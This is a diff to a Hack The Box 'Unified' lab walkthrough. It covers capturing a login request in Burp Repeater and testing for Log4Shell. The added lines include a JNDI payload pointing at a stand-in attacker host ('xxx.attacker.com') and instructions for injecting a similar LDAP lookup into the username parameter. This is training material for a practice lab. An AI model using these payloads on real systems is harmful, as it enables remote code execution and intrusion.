@@ -93,10 +93,18 @@ As shown in the figure below, we can see <code>{username:, password:, remember:,
 <code>Right click</code>  on BurpSuite page ⇒ <code>send to repeater</code><br> 
 FYI：<a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">Burp Repeater</a><br> 
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/SentToRepeater.png" alt="SentToRepeater" width="60%">
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/Repeater.png" alt="Repeater" width="60%">
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/Repeater.png" alt="Repeater" width="60%"><br> 
 Go to <code>Repeater</code> and press <code>Send</code> to see detailed information about the web page Response.<br>
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/repeaterinvalid.png" alt="repeaterinvalid" width="60%">
-FYI：<a href="https://www.dynatrace.com/news/blog/what-is-log4shell/">Log4Shell</a>
+FYI：<a href="https://www.dynatrace.com/news/blog/what-is-log4shell/">Log4Shell</a><br> 
+Hackers can add a <code>JNDI</code> query expression such as <code>${jndi:ldap://xxx.attacker.com/exp}</code>,<br> 
+malicious programs will be downloaded or executed if the URL contains them.<br>
+
+We can see that there are four parameters namely username/passwd/remember/strict,<br>
+do JNDI malicious parameter insertion starting from the first parameter,<br>
+replace the payload of username with <code>${jndi:ldap://&lt;local_ip&gt;/&lt;random_input&gt;}</code> and send it.<br>
+You can see the msg：<code>api.err.Invalid</code> in the response on the right.<br>
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/repeaterinvalid.png" alt="repeaterinvalid" width="60%"><br> 
+
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/repeaterinvalid2.png" alt="repeaterinvalid2" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/Repeater2.png" alt="Repeater2" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump.png" alt="tcpdump" width="60%">
